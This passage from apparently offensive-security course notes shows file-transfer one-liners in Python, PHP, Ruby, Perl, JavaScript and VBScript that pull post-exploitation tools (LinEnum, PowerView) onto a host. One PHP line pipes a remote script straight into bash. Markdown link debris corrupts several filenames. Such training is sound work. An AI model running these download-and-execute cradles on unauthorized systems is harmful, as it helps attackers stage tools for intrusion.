**Python 2 - Download**

```bash
python2.7 -c 'import urllib;urllib.urlretrieve ("<https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh>", "[LinEnum.sh](<http://linenum.sh/>)")'
```

**Python 3 - Download**

```bash
python3 -c 'import urllib.request;urllib.request.urlretrieve("<https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh>", "[LinEnum.sh](<http://linenum.sh/>)")'
```

**PHP**

Let's see some examples of downloading files using PHP.

In the following example, we will use the PHP `file_get_contents()` module to download content from a website combined with the `file_put_contents()` module to save the file into a directory. PHP can be used to run one-liners from an operating system command line using the option `-r`.

**PHP Download with File_get_contents()**

```bash
php -r '$file = file_get_contents("<https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh>"); file_put_contents("[LinEnum.sh](<http://linenum.sh/>)",$file);'
```

An alternative to file_get_contents() and file_put_contents() is the fopen() module. We can use this module to open a URL, read it's content and save it into a file.

**PHP Download with Fopen()**

```bash
php -r 'const BUFFER = 1024; $fremote = fopen("<https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh>", "rb"); $flocal = fopen("[LinEnum.sh](<http://linenum.sh/>)", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

We can also send the downloaded content to a pipe instead, similar to the fileless example we executed in the previous section using cURL and wget.

**PHP Download a File and Pipe it to Bash**

```bash
php -r '$lines = @file("<https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

**Other Languages**

Ruby and Perl are other popular languages that can also be used to transfer files. These two programming languages also support running one-liners from an operating system command line using the option -e. **Ruby - Download a File**

```bash
ruby -e 'require "net/http"; File.write("[LinEnum.sh](<http://linenum.sh/>)", Net::HTTP.get(URI.parse("<https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh>")))'
```

**Perl - Download a File**

```bash
perl -e 'use LWP::Simple; getstore("<https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh>", "[LinEnum.sh](<http://linenum.sh/>)");'
```

**JavaScript** The following JavaScript code is based on this post, and we can download a file using it. We'll create a file called `wget.js` and save the following content:

```bash
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

We can use the following command from a Windows command prompt or PowerShell terminal to execute our JavaScript code and download a file.

**Download a File Using JavaScript and cscript.exe**

```bash
C:\\htb> cscript.exe /nologo wget.js <https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1> PowerView.ps1
```

**VBScript** The following VBScript example can be used based on this. We'll create a file called `wget.vbs` and save the following content:

The following VBScript example can be used based on this. We'll create a file called wget.vbs and save the following content:

```bash
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
.type = 1
.open
.write xHttp.responseBody
.savetofile WScript.Arguments.Item(1), 2
end with
```

We can use the following command from a Windows command prompt or PowerShell terminal to execute our VBScript code and download a file.

**Download a File Using VBScript and cscript.exe**

```bash
C:\\htb> cscript.exe /nologo wget.vbs <https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1> PowerView2.ps1
```